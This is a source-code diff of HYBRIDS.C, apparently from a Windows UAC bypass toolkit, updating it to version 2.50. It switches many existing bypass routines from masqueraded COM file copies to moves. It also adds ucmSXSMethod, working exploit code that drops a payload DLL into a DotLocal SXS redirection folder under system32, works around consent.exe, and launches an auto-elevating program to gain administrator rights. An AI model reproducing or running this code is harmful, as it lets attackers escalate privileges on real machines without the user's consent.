@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.40
+*  VERSION:     2.50
 *
-*  DATE:        01 July 2016
+*  DATE:        06 July 2016
 *
 *  Hybrid UAC bypass methods.
 *
@@ -218,11 +218,11 @@ BOOL ucmWinSATMethod(
             _strcpy(szBuffer, g_ctx.szSystemDirectory);
             _strcat(szBuffer, SYSPREP_DIR);
 
-            bResult = ucmMasqueradedCopyFileCOM(szSource, szBuffer);
+            bResult = ucmMasqueradedMoveFileCOM(szSource, szBuffer);
             if (!bResult) {
                 break;
             }
-            bResult = ucmMasqueradedCopyFileCOM(szDest, szBuffer);
+            bResult = ucmMasqueradedMoveFileCOM(szDest, szBuffer);
             if (!bResult) {
                 break;
             }
@@ -319,7 +319,7 @@ BOOL ucmMMCMethod(
         default:
             lpMscFile = EVENTVWR_MSC;
             break;
-        }   
+        }
 
         //put target dll
         RtlSecureZeroMemory(szSource, sizeof(szSource));
@@ -331,8 +331,8 @@ BOOL ucmMMCMethod(
             break;
         }
 
-        //drop proxy dll to target directory
-        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        //move proxy dll to target directory
+        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
         if (!bResult) {
             break;
         }
@@ -426,11 +426,11 @@ BOOL ucmSirefefMethod(
             break;
         }
 
-        //copy dll to wbem target folder
+        //move dll to wbem target folder
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, g_ctx.szSystemDirectory);
         _strcat(szBuffer, WBEM_DIR);
-        bResult = ucmMasqueradedCopyFileCOM(szSource, szBuffer);
+        bResult = ucmMasqueradedMoveFileCOM(szSource, szBuffer);
         if (!bResult) {
             break;
         }
@@ -447,7 +447,7 @@ BOOL ucmSirefefMethod(
             break;
         }
 
-        bResult = ucmMasqueradedCopyFileCOM(szDest, szBuffer);
+        bResult = ucmMasqueradedMoveFileCOM(szDest, szBuffer);
         if (!bResult) {
             break;
         }
@@ -554,7 +554,7 @@ BOOL ucmGenericAutoelevation(
         _strcpy(szDest, g_ctx.szSystemDirectory);
 
         //drop fubuki to system32
-        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
         if (!bResult) {
             break;
         }
@@ -626,7 +626,7 @@ BOOL ucmGWX(
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx.szSystemDirectory);
         _strcat(szDest, INETSRV_DIR);
-        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
         if (!bResult) {
             break;
         }
@@ -642,7 +642,7 @@ BOOL ucmGWX(
         }
 
         //drop InetMgr.exe to system32\inetsrv
-        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
         if (!bResult) {
             break;
         }
@@ -687,7 +687,7 @@ BOOL ucmAutoElevateManifestDropDll(
     RtlSecureZeroMemory(szDest, sizeof(szDest));
     _strcpy(szDest, g_ctx.szSystemDirectory);
     _strcat(szDest, SYSPREP_DIR);
-    return ucmMasqueradedCopyFileCOM(szSource, szDest);
+    return ucmMasqueradedMoveFileCOM(szSource, szDest);
 }
 
 /*
@@ -734,7 +734,7 @@ BOOL ucmAutoElevateManifestW7(
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
         _strcat(szDest, TEXT("\\"));
-        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
         if (!bResult) {
             break;
         }
@@ -755,7 +755,7 @@ BOOL ucmAutoElevateManifestW7(
 
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
-        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
         if (!bResult) {
             break;
         }
@@ -818,7 +818,7 @@ BOOL ucmAutoElevateManifest(
         // Copy target app to home
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx.szSystemDirectory);
-        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
         if (!bResult) {
             break;
         }
@@ -838,7 +838,7 @@ BOOL ucmAutoElevateManifest(
         }
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx.szSystemDirectory);
-        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
         if (!bResult) {
             break;
         }
@@ -958,7 +958,7 @@ BOOL ucmInetMgrFindCallback(
         RtlSecureZeroMemory(&szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx.szSystemDirectory);
         _strcat(szDest, INETSRV_DIR);
-        bSuccess = ucmMasqueradedCopyFileCOM(textbuf, szDest);
+        bSuccess = ucmMasqueradedMoveFileCOM(textbuf, szDest);
         if (!bSuccess)
             break;
 
@@ -968,7 +968,7 @@ BOOL ucmInetMgrFindCallback(
         if (!bSuccess)
             break;
 
-        bSuccess = ucmMasqueradedCopyFileCOM(textbuf, szDest);
+        bSuccess = ucmMasqueradedMoveFileCOM(textbuf, szDest);
         if (!bSuccess)
             break;
 
@@ -1065,6 +1065,234 @@ BOOL ucmInetMgrMethod(
         }
 
     } while (bCond);
+
+    return bResult;
+}
+
+/*
+* ucmSetupAkagiLink
+*
+* Purpose:
+*
+* Give Ikazuchi proper key to work with.
+*
+*/
+BOOL ucmSetupAkagiLink(
+    VOID
+    )
+{
+    BOOL bCond = FALSE, bResult = FALSE;
+    HANDLE hRoot = NULL, hChild = NULL;
+    LPWSTR lpUser;
+    NTSTATUS status;
+    UNICODE_STRING ChildName, ParentRoot, usKey;
+    OBJECT_ATTRIBUTES attr;
+
+    RtlSecureZeroMemory(&usKey, sizeof(usKey));
+
+    do {
+        status = RtlFormatCurrentUserKeyPath(&usKey);
+        if (!NT_SUCCESS(status))
+            break;
+
+        lpUser = _filename(usKey.Buffer);
+
+        RtlInitUnicodeString(&ParentRoot, L"\\Rpc Control\\Akagi");
+        InitializeObjectAttributes(&attr, &ParentRoot, OBJ_CASE_INSENSITIVE, 0, NULL);
+        status = NtCreateDirectoryObject(&hRoot, DIRECTORY_CREATE_SUBDIRECTORY, &attr);
+        if (!NT_SUCCESS(status))
+            break;
+
+        RtlInitUnicodeString(&ChildName, lpUser);
+        attr.RootDirectory = hRoot;
+        attr.ObjectName = &ChildName;
+        status = NtCreateDirectoryObject(&hChild, DIRECTORY_ALL_ACCESS, &attr);
+        if (!NT_SUCCESS(status))
+            break;
+
+        bResult = TRUE;
+
+    } while (bCond);
+
+    //
+    // Cleanup created objects if something went wrong.
+    // Otherwise objects will die together with process at exit.
+    //
+    if (bResult != TRUE) {
+        if (hRoot) {
+            NtClose(hRoot);
+        }
+        if (hChild) {
+            NtClose(hChild);
+        }
+    }
+
+    if (usKey.Buffer) {
+        RtlFreeUnicodeString(&usKey);
+    }
+    return bResult;
+}
+
+/*
+* ucmSXSMethod
+*
+* Purpose:
+*
+* Exploit SXS Local Redirect feature.
+*
+* SXS/Fusion uses dll redirection, attempting to load internal manifest dependencies from 
+* non existent directory (this is so called DotLocal dll redirection), it is trying to do this 
+* before going to WinSXS store.
+*
+* In this case dependency is Microsoft.Windows.Common-Controls.
+*
+* Maybe you think it is handy cool feature, but I think its another backdoor from lazy dotnet crew.
+* "You keep shipping crap, and crap, and more crap".
+*
+*/
+BOOL ucmSXSMethod(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize,
+    LPWSTR lpTargetDirectory, //single element in system32 with slash at end
+    LPWSTR lpTargetApplication, //executable name
+    LPWSTR lpLaunchApplication, //executable name, must be in same dir as lpTargetApplication
+    BOOL bConsentItself
+    )
+{
+    BOOL     bCond = FALSE, bResult = FALSE;
+    WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
+    SIZE_T   sz;
+    LPWSTR   lpSxsPath = NULL;
+
+    WCHAR szSrc[MAX_PATH * 2], szDst[MAX_PATH * 2];
+   
+    SXS_SEARCH_CONTEXT sctx;
+
+    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
+        return bResult;
+
+    if (lpTargetApplication == NULL)
+        return bResult;
+
+    if (_strlen(lpTargetApplication) > MAX_PATH)
+        return bResult;
+
+    do {
+        //common part, locate sxs dll, drop payload to temp
+        RtlSecureZeroMemory(szSrc, sizeof(szSrc));
+        RtlSecureZeroMemory(szDst, sizeof(szDst));
+
+        sz = UNICODE_STRING_MAX_BYTES;
+        NtAllocateVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (lpszFullDllPath == NULL)
+            break;
+
+        sctx.DllName = COMCTL32_DLL;
+        sctx.PartialPath = COMCTL32_SXS;
+        sctx.FullDllPath = lpszFullDllPath;
+
+        if (!NT_SUCCESS(LdrEnumerateLoadedModules(0, &sxsFindDllCallback, (PVOID)&sctx)))
+            break;
+
+        lpszDirectoryName = _filename(lpszFullDllPath);
+        if (lpszDirectoryName == NULL)
+            break;
+
+        sz = 0x1000 + (_strlen(lpszDirectoryName) * sizeof(WCHAR));
+        NtAllocateVirtualMemory(NtCurrentProcess(), &lpSxsPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (lpSxsPath == NULL)
+            break;
+
+        //drop payload dll
+        _strcpy(szSrc, g_ctx.szTempDirectory);
+        _strcat(szSrc, COMCTL32_DLL);
+
+        bResult = supWriteBufferToFile(szSrc, ProxyDll, ProxyDllSize);
+        if (!bResult)
+            break;
+
+        _strcpy(lpSxsPath, g_ctx.szSystemDirectory);
+        if (lpTargetDirectory) {
+            _strcat(lpSxsPath, lpTargetDirectory);
+        }
+        _strcpy(szDst, lpTargetApplication);
+
+        //
+        // Workaround for consent, so it won't ban itself.
+        // Create all files and target directories with fake root name.
+        // Next when all fileop is done, rename fake root to real.
+        //
+        if (bConsentItself) {
+            _strcat(szDst, FAKE_LOCAL_SXS);
+        }
+        else {
+            _strcat(szDst, LOCAL_SXS);
+        }
+
+        //create local directory
+        if (!ucmMasqueradedCreateSubDirectoryCOM(lpSxsPath, szDst))
+            break;
+
+        //create assembly directory
+        _strcat(lpSxsPath, szDst);
+        if (!ucmMasqueradedCreateSubDirectoryCOM(lpSxsPath, lpszDirectoryName))
+            break;
+
+        //move payload file
+        _strcat(lpSxsPath, TEXT("\\"));
+        _strcat(lpSxsPath, lpszDirectoryName);
+        if (!ucmMasqueradedMoveFileCOM(szSrc, lpSxsPath))
+            break;
+
+        //
+        // Consent workaround end. 
+        // Restore real directory name.
+        //
+        if (bConsentItself) {
+            _strcpy(lpSxsPath, g_ctx.szSystemDirectory);
+            if (lpTargetDirectory) {
+                _strcat(lpSxsPath, lpTargetDirectory);
+            }
+            _strcat(lpSxsPath, lpTargetApplication);
+            _strcat(lpSxsPath, FAKE_LOCAL_SXS);
+
+            _strcpy(szDst, lpTargetApplication);
+            _strcat(szDst, LOCAL_SXS);
+
+            bResult = ucmMasqueradedRenameElementCOM(lpSxsPath, szDst);
+            if (!bResult)
+                break;
+
+            //put a link to Ikazuchi, so she can find proper key.
+            ucmSetupAkagiLink();
+        }
+
+        //run target process
+        _strcpy(szDst, g_ctx.szSystemDirectory);
+        if (lpTargetDirectory) {
+            _strcat(szDst, lpTargetDirectory);
+        }
+       
+        if (lpLaunchApplication) {
+            _strcat(szDst, lpLaunchApplication);
+        }
+        else {
+            _strcat(szDst, lpTargetApplication);
+        }
+        bResult = supRunProcess(szDst, NULL);
+        Sleep(1000);
+
+    } while (bCond);
+  
+    if (lpszFullDllPath) {
+        sz = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, &sz, MEM_RELEASE);
+    }
+
+    if (lpSxsPath) {
+        sz = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), &lpSxsPath, &sz, MEM_RELEASE);
+    }
 
     return bResult;
 }
